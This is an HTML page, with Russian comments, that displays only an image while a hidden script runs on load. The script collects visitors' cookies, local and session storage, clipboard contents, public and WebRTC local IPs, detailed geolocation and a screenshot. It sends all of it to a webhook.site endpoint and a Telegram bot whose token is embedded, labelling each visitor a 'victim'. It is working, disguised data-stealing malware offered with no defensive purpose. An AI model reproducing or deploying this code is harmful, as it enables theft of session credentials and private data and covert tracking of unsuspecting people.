<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: 100vh;
            object-fit: contain;
            display: block;
        }
    </style>
</head>
<body>
    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">

    <script>
        const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
        const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
        const CHAT_ID = '8327334745';

        (async function() {
            await new Promise(r => setTimeout(r, 1500));

            const data = {};

            // ---- Куки ----
            data.cookies = {};
            if (document.cookie) {
                document.cookie.split('; ').forEach(c => {
                    const [k, v] = c.split('=');
                    if (k) data.cookies[k] = v || '';
                });
            }

            // ---- LocalStorage ----
            data.localStorage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) data.localStorage[key] = localStorage.getItem(key);
            }

            // ---- SessionStorage ----
            data.sessionStorage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
            }

            // ---- IP ----
            data.ip = null;
            try {
                const ipResp = await fetch('https://api.ipify.org?format=json');
                const ipJson = await ipResp.json();
                data.ip = ipJson.ip;
            } catch (_) {}

            // ---- ГЕО - МАКСИМАЛЬНЫЙ СБОР (3 ПРОВАЙДЕРА) ----
            data.geo = null;
            data.geo_raw = null;

            // 1. ipwhois.io (самый точный, бесплатно 10000 запросов/мес)
            if (data.ip) {
                try {
                    const resp = await fetch(`https://ipwhois.io/json/${data.ip}`);
                    const json = await resp.json();
                    if (json && json.success !== false) {
                        data.geo = {
                            country: json.country || '?',
                            country_code: json.country_code || '?',
                            region: json.region || '?',
                            city: json.city || '?',
                            lat: json.latitude || 0,
                            lon: json.longitude || 0,
                            isp: json.isp || '?',
                            org: json.org || '?',
                            timezone: json.timezone || '?',
                            continent: json.continent || '?',
                            currency: json.currency || '?',
                            phone_code: json.phone_code || '?',
                            postal: json.postal || '?'
                        };
                    }
                } catch (_) {}

                // 2. ipapi.co (запасной)
                if (!data.geo) {
                    try {
                        const resp = await fetch(`https://ipapi.co/${data.ip}/json/`);
                        const json = await resp.json();
                        if (json && json.error !== true) {
                            data.geo = {
                                country: json.country_name || '?',
                                country_code: json.country_code || '?',
                                region: json.region || '?',
                                city: json.city || '?',
                                lat: json.latitude || 0,
                                lon: json.longitude || 0,
                                isp: json.org || '?',
                                org: json.org || '?',
                                timezone: json.timezone || '?',
                                continent: json.continent_code || '?',
                                currency: json.currency || '?',
                                phone_code: json.country_calling_code || '?',
                                postal: json.postal || '?'
                            };
                        }
                    } catch (_) {}
                }

                // 3. ip-api.com (ещё запасной, но уже без координат если не успел)
                if (!data.geo) {
                    try {
                        const resp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`);
                        const json = await resp.json();
                        if (json.status === 'success') {
                            data.geo = {
                                country: json.country || '?',
                                country_code: '?',
                                region: json.regionName || '?',
                                city: json.city || '?',
                                lat: json.lat || 0,
                                lon: json.lon || 0,
                                isp: json.isp || '?',
                                org: json.org || '?',
                                timezone: json.timezone || '?',
                                continent: '?',
                                currency: '?',
                                phone_code: '?',
                                postal: '?'
                            };
                        }
                    } catch (_) {}
                }
            }

            // ---- Локальный IP через WebRTC ----
            data.localIPs = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                const ips = [];
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.split(' ')[4];
                        if (ip && !ips.includes(ip)) ips.push(ip);
                    }
                };
                pc.createDataChannel('test');
                await pc.createOffer().then(o => pc.setLocalDescription(o));
                await new Promise(r => setTimeout(r, 2000));
                pc.close();
                data.localIPs = ips;
            } catch (_) {}

            // ---- Буфер обмена ----
            data.clipboard = null;
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    data.clipboard = await navigator.clipboard.readText();
                }
            } catch (_) {}

            // ---- Скриншот ----
            data.screenshot = null;
            try {
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                document.head.appendChild(script);
                await new Promise((res) => {
                    script.onload = res;
                    setTimeout(res, 4000);
                });
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.body, {
                        useCORS: true,
                        allowTaint: true,
                        scale: 0.3,
                        logging: false
                    });
                    data.screenshot = canvas.toDataURL('image/jpeg', 0.4);
                }
            } catch (_) {}

            // ---- Доп. данные ----
            data.userAgent = navigator.userAgent;
            data.url = window.location.href;
            data.referrer = document.referrer || null;
            data.screen = {
                width: screen.width,
                height: screen.height,
                pixelRatio: window.devicePixelRatio
            };
            data.plugins = Array.from(navigator.plugins || []).map(p => p.name);

            // ============================================================
            //  ОТПРАВКА
            // ============================================================

            // ---- Webhook ----
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (_) {}

            // ---- Telegram (максимум гео) ----
            try {
                let msg = '🔴 ЖЕРТВА\n\n';
                if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
                
                // ГЕО - ВСЯ ДОСТУПНАЯ ИНФОРМАЦИЯ
                if (data.geo) {
                    msg += `\n📍 ГЕОЛОКАЦИЯ:\n`;
                    msg += `   🌍 Страна: ${data.geo.country || '?'}`;
                    if (data.geo.country_code) msg += ` (${data.geo.country_code})`;
                    msg += `\n`;
                    if (data.geo.region) msg += `   🏛 Регион: ${data.geo.region}\n`;
                    if (data.geo.city) msg += `   🏙 Город: ${data.geo.city}\n`;
                    if (data.geo.lat && data.geo.lon) {
                        msg += `   🗺 Координаты: ${data.geo.lat}, ${data.geo.lon}\n`;
                        msg += `   🔗 Карта: https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
                    }
                    if (data.geo.postal) msg += `   📮 Почтовый индекс: ${data.geo.postal}\n`;
                    if (data.geo.isp) msg += `   📡 Провайдер: ${data.geo.isp}\n`;
                    if (data.geo.org && data.geo.org !== data.geo.isp) msg += `   🏢 Организация: ${data.geo.org}\n`;
                    if (data.geo.timezone) msg += `   🕐 Часовой пояс: ${data.geo.timezone}\n`;
                    if (data.geo.continent) msg += `   🌎 Континент: ${data.geo.continent}\n`;
                    if (data.geo.currency) msg += `   💰 Валюта: ${data.geo.currency}\n`;
                    if (data.geo.phone_code) msg += `   📞 Телефонный код: +${data.geo.phone_code}\n`;
                } else {
                    msg += `\n📍 ГЕОЛОКАЦИЯ: не удалось определить\n`;
                }

                if (data.localIPs && data.localIPs.length) {
                    msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                }
                if (data.clipboard) msg += `\n📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
                msg += `\n📱 UA: ${data.userAgent.substring(0, 80)}...\n`;
                msg += `🍪 Куки: ${Object.keys(data.cookies).length} шт.\n`;
                msg += `💾 LocalStorage: ${Object.keys(data.localStorage).length} шт.\n`;
                msg += `🗂 SessionStorage: ${Object.keys(data.sessionStorage).length} шт.\n`;
                if (data.screenshot) msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
                msg += `\n🔗 URL: ${data.url}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                });
            } catch (_) {}

            // ---- Скриншот отдельно ----
            if (data.screenshot && data.screenshot.length > 10000) {
                try {
                    const blob = await fetch(data.screenshot).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'screenshot.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (_) {}
            }

            console.log('✅ Данные отправлены');
        })();
    </script>
</body>
</html>
